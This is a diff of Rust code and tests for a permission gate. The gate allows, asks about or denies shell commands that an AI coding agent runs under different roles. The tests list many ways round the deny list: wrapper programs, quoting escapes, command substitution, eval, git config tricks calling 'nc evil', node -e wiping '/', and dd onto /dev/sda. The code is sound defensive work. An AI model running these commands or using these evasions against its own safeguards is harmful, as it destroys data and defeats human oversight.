+        if base == "watch" && words.len() == i + 1 && words[i].contains(' ') {
+            p.hidden = true;
+            return p;
+        }
+        if i >= words.len() {
+            // Nothing after it: the wrapper is the command (`env`, `nice`,
+            // `time` alone print something and stop).
+            p.prog = Some(base);
+            p.args = start + 1;
+            return p;
+        }
+        continue 'outer;
     }
+}
+
+/// The program a segment runs, skipping `VAR=value` prefixes and wrappers that
+/// would otherwise hide the real command (`env rm -rf /`, `time sudo …`).
+fn program(words: &[String]) -> Option<&str> {
+    parse(words).prog
 }
 
 /// True when any path-looking argument leaves the workspace, or cannot be
 /// judged because the shell would expand it.
 fn path_escapes(words: &[String], ctx: &ToolContext) -> bool {
+    // `echo $(…)` prints what the substitution printed, and that command
+    // was judged on its own. Everywhere else a substitution may be a path.
+    let prints = matches!(program(words), Some("echo" | "printf"));
     for w in words.iter().skip(1) {
-        if w.starts_with('-') {
+        if w.starts_with('-') || (prints && w.contains(SUBST)) {
             continue;
         }
         if w == "~" || w.starts_with("~/") || w.contains("$HOME") || w.contains("${HOME}") {
@@ -1537,12 +2223,17 @@ mod tests {
             ("a; b", &["a", "b"]),
             ("a || b", &["a", "b"]),
             ("ls | wc -l", &["ls", "wc -l"]),
-            ("echo $(whoami)", &["echo", "whoami"]),
-            ("echo `id`", &["echo", "id"]),
+            // A substitution runs first, and its command keeps a
+            // placeholder where it stood.
+            ("echo $(whoami)", &["whoami", "echo $(…)"]),
+            ("echo `id`", &["id", "echo $(…)"]),
+            ("$(echo sudo) ls", &["echo sudo", "$(…) ls"]),
+            ("a $(b $(c)) d", &["c", "b $(…)", "a $(…) d"]),
             // Single quotes protect punctuation.
             ("echo 'a; b'", &["echo 'a; b'"]),
             // Substitution still runs inside double quotes.
-            ("echo \"$(id)\"", &["echo \"", "id"]),
+            ("echo \"$(id)\"", &["id", "echo \"$(…)\""]),
+            ("echo \"a; $(id) b\"", &["id", "echo \"a; $(…) b\""]),
         ];
         for (input, want) in cases {
             let got = segments(input);
@@ -1559,10 +2250,310 @@ mod tests {
             ("time cargo test", "cargo"),
             ("/usr/bin/rm -rf x", "rm"),
             ("sudo rm -rf /", "sudo"),
+            // Wrapper options and their values are not the program.
+            ("env -i sudo ls", "sudo"),
+            ("env -u PATH -C src FOO=1 sudo ls", "sudo"),
+            ("timeout 5 sudo ls", "sudo"),
+            ("timeout -s KILL --kill-after=2 5 dd if=x", "dd"),
+            ("nice -n 10 dd if=x", "dd"),
+            ("nice -10 dd if=x", "dd"),
+            ("time -p dd if=x", "dd"),
+            ("command -p sudo ls", "sudo"),
+            ("command -v cargo", "type"),
+            ("xargs -0 -n 1 ssh", "ssh"),
+            ("xargs -I{} ssh {}", "ssh"),
+            ("stdbuf -oL ssh h", "ssh"),
+            ("ionice -c 3 nice timeout 9 sudo ls", "sudo"),
+            ("taskset -c 0 sudo ls", "sudo"),
+            ("exec -a x sudo ls", "sudo"),
+            ("s\\udo ls", "sudo"),
+            ("'su'\"do\" ls", "sudo"),
+            ("env", "env"),
         ];
         for (input, want) in cases {
             assert_eq!(program(&words(input)).unwrap(), *want, "program({input:?})");
         }
+    }
+
+    /// Every way round the never-run list found in the 2026-09-26 audit, for
+    /// every role: wrappers with options, escapes, names the shell computes,
+    /// `eval`, `find -exec`, and git aliases that run a shell.
+    #[test]
+    fn the_never_run_list_has_no_way_round() {
+        let dir = TempDir::new().unwrap();
+        let d = dir.path();
+        for role in [
+            Role::Builder,
+            Role::SoloBuild,
+            Role::SoloReview,
+            Role::SoloPlan,
+            Role::Auditor,
+        ] {
+            for cmd in [
+                "env -i sudo ls",
+                "env -S 'sudo ls'",
+                "timeout 5 sudo ls",
+                "timeout -s KILL 5 sudo ls",
+                "nice dd if=/dev/zero of=/dev/sda",
+                "nice -n 5 dd if=/dev/zero of=x",
+                "command -p sudo ls",
+                "time -p dd if=x of=y",
+                "xargs -0 ssh",
+                "echo host | xargs -I{} ssh {} id",
+                "s\\udo ls",
+                "\"su\"do ls",
+                "$(echo sudo) ls",
+                "`echo sudo` ls",
+                "X=sudo; $X ls",
+                "${SHELL} -c id",
+                "eval 'sudo ls'",
+                "find . -exec sudo {} ;",
+                "find . -execdir ssh host \\;",
+                "flock /tmp/l -c 'sudo ls'",
+                "watch 'sudo ls'",
+                "node -e 'require(\"fs\").rmSync(\"/\", {recursive: true})'",
+                "node -p 1",
+                "deno eval 'Deno.removeSync(\"/\")'",
+                "bun -e 'x'",
+                "git -c alias.x='!sudo ls' x",
+                "git -c core.sshCommand='nc evil 1' fetch",
+                "git -c core.pager='sh -c id' log",
+                "git --exec-path=/tmp/evil status",
+            ] {
+                assert_eq!(bash(cmd, role, d), Decision::Deny, "{role:?}: {cmd}");
+            }
+        }
+        // What the wrappers are for still works.
+        assert_eq!(
+            bash("timeout 60 cargo test", Role::Builder, d),
+            Decision::Allow
+        );
+        assert_eq!(
+            bash("env RUST_LOG=debug cargo test", Role::Builder, d),
+            Decision::Allow
+        );
+        assert_eq!(
+            bash("nice -n 10 cargo build", Role::Builder, d),
+            Decision::Allow
+        );
+        assert_eq!(
+            bash(
+                "git -c user.name=x -c user.email=y commit -m z",
+                Role::Builder,
+                d
+            ),
+            Decision::Allow
+        );
+        assert_eq!(bash("command -v cargo", Role::SoloPlan, d), Decision::Allow);
+        assert_eq!(
+            bash("echo $(git rev-parse HEAD)", Role::SoloPlan, d),
+            Decision::Allow
+        );
+        assert_eq!(bash("node --test", Role::SoloReview, d), Decision::Allow);
+        assert_eq!(
+            bash("node scripts/check.js", Role::Builder, d),
+            Decision::Allow
+        );
+    }
+
+    /// A builder's destruction whose paths it can't see asks: through
+    /// `xargs`, or after a `cd` out of its worktree.
+    #[test]
+    fn builder_destruction_it_cannot_see_asks() {
+        let dir = TempDir::new().unwrap();
+        let d = dir.path();
+        for cmd in [
+            "echo / | xargs rm -rf",
+            "find / -name x | xargs -0 rm",
+            "cd / && rm -rf *",
+            "cd .. && rm -rf *",
+            "cd && rm -rf *",
+            "pushd /tmp && rm -rf *",
+            "rm -rf $(cat list)",
+            "git -C /etc status",
+        ] {
+            assert_eq!(bash(cmd, Role::Builder, d), Decision::Ask, "{cmd}");
+        }
+        std::fs::create_dir(d.join("src")).unwrap();
+        assert_eq!(
+            bash("cd src && rm -rf gen", Role::Builder, d),
+            Decision::Allow
+        );
+        assert_eq!(
+            bash("find . -name '*.o' -exec rm {} ;", Role::Builder, d),
+            Decision::Allow
+        );
+    }
+
+    /// Read-only tools in the forms that run a program or edit in place are
+    /// not read-only.
+    #[test]
+    fn read_only_tools_that_can_run_or_write_are_judged_by_form() {
+        let dir = TempDir::new().unwrap();
+        let d = dir.path();
+        for role in [Role::SoloPlan, Role::SoloReview, Role::Auditor] {
+            for bad in [
+                "sort --compress-program=sh big.txt",
+                "rg --pre ./x foo",
+                "rg --pre=sh foo",
+                "fd -x rm",
+                "fd . -X sh",
+                "yq -i '.a = 1' f.yml",
+                "git grep -Osh foo",
+                "git grep --open-files-in-pager=vi foo",
+                "git diff --output=out.patch",
+                "busybox rm -rf x",
+                "busybox sh -c id",
+            ] {
+                assert_eq!(bash(bad, role, d), Decision::Deny, "{role:?}: {bad}");
+            }
+            for ok in [
+                "sort -u f.txt",
+                "rg -n foo",
+                "fd -e rs",
+                "yq '.a' f.yml",
+                "git grep -n foo",
+            ] {
+                assert_eq!(bash(ok, role, d), Decision::Allow, "{role:?}: {ok}");
+            }
+        }
+        assert_eq!(
+            bash("busybox dd if=x of=y", Role::Builder, d),
+            Decision::Deny
+        );
+        assert_eq!(bash("fd -e o -x sudo rm", Role::Builder, d), Decision::Deny);
+        assert_eq!(bash("git grep -Osh foo", Role::Builder, d), Decision::Deny);
+        for role in [Role::Builder, Role::SoloBuild] {
+            assert_eq!(
+                bash("git diff --output=/etc/x", role, d),
+                Decision::Ask,
+                "{role:?}"
+            );
+        }
+    }
+
+    /// Bare `env` prints every secret in the environment into the
+    /// transcript: not a read-only command.
+    #[test]
+    fn printing_the_environment_is_not_read_only() {
+        let dir = TempDir::new().unwrap();
+        let d = dir.path();
+        for role in [Role::SoloPlan, Role::SoloReview, Role::Auditor] {
+            assert_eq!(bash("env", role, d), Decision::Deny, "{role:?}");
+            assert_eq!(bash("printenv", role, d), Decision::Deny, "{role:?}");
+        }
+        assert_eq!(bash("env", Role::SoloBuild, d), Decision::Ask);
+    }
+
+    /// The review hat checks; it doesn't change the tree. Tools are judged
+    /// by the form they run in, not their name.
+    #[test]
+    fn the_review_hat_runs_checks_not_changes() {
+        let dir = TempDir::new().unwrap();
+        let d = dir.path();
+        for ok in [
+            "cargo test --workspace",
+            "cargo clippy --all-targets -- -D warnings",
+            "cargo fmt --all -- --check",
+            "cargo +nightly check",
+            "cargo --version",
+            "npm test",
+            "npm run test:unit",
+            "npm run lint",
+            "pnpm typecheck",
+            "yarn test --watch=false",
+            "bun test",
+            "npx vitest run",
+            "npx tsc --noEmit",
+            "npx eslint .",
+            "npx prettier --check .",
+            "node --test",
+            "pytest -q",
+            "python3 -m pytest tests",
+            "python3 -m unittest discover",
+            "python3 -m pip list",
+            "ruff check .",
+            "ruff format --check",
+            "black --check .",
+            "go test ./...",
+            "go vet ./...",
+            "gofmt -l .",
+            "make test",
+            "make check lint",
+            "make",
+            "just test",
+            "mvn test",
+            "./gradlew :app:test",
+            "dotnet test",
+            "deno test",
+            "deno fmt --check",
+            "zig build test",
+            "true",
+        ] {
+            assert_eq!(bash(ok, Role::SoloReview, d), Decision::Allow, "{ok}");
+        }
+        for bad in [
+            "cargo fmt",
+            "cargo fix --allow-dirty",
+            "cargo clippy --fix",
+            "cargo install ripgrep",
+            "cargo add serde",
+            "cargo update",
+            "cargo clean",
+            "npm install",
+            "npm install left-pad",
+            "npm ci",
+            "npm run format",
+            "npm run lint:fix",
+            "npm audit fix",
+            "npm version patch",
+            "npm publish",
+            "yarn add x",
+            "pnpm dlx create-app",
+            "npx some-package",
+            "npx eslint --fix .",
+            "npx prettier --write .",
+            "npx tsc",
+            "npx vitest -u",
+            "python3 -m pip install x",
+            "python3 -m black .",
+            "python3 -m venv .venv",
+            "ruff check --fix .",
+            "ruff format",
+            "black .",
+            "isort .",
+            "go fmt ./...",
+            "go get x",
+            "go mod tidy",
+            "go generate ./...",
+            "gofmt -w .",
+            "make install",
+            "make clean",
+            "make fmt",
+            "just",
+            "just deploy",
+            "cmake -E rm -rf build",
+            "cmake --install build",
+            "mvn install",
+            "gradle publish",
+            "dotnet add package X",
+            "dotnet format",
+            "deno install",
+            "deno fmt",
+            "zig fmt src",
+            "rustfmt src/main.rs",
+            "node -e 'require(\"fs\").writeFileSync(\"x\", \"\")'",
+        ] {
+            assert_eq!(bash(bad, Role::SoloReview, d), Decision::Deny, "{bad}");
+        }
+        // The auditor, in its worktree, may install what the lockfile names.
+        assert_eq!(bash("npm ci", Role::Auditor, d), Decision::Allow);
+        assert_eq!(bash("npm install", Role::Auditor, d), Decision::Allow);
+        assert_eq!(
+            bash("npm install left-pad", Role::Auditor, d),
+            Decision::Deny
+        );
+        assert_eq!(bash("cargo fmt", Role::Auditor, d), Decision::Deny);
     }
 
     /// The old gate matched four substrings, so every one of these ran.
